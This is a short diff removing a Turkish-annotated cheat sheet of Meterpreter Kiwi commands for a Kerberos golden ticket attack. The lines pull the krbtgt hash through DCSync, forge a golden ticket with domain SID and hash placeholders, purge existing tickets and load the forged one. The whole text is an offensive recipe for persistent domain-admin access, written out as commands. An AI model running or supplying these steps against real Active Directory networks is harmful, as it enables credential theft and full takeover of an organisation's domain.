@@ -1,7 +1,0 @@
-Golden ticket (meterpreter):
--load kiwi
--dcsync_ntlm krbtgt
--golden ticket create -d <domain> -u <user> -s <domain_sid> -k <krbtgt_hash> -t golden_ticket.tck : ticket olusturur
--kerberos_list 
--kerberos_ticket_purge : bu komut ile tum ticketlari siler
--kerberos_ticket_use <olusturdugumuzticketadi> : bu komut ile olusturdugumuz ticket yukluyoruz 
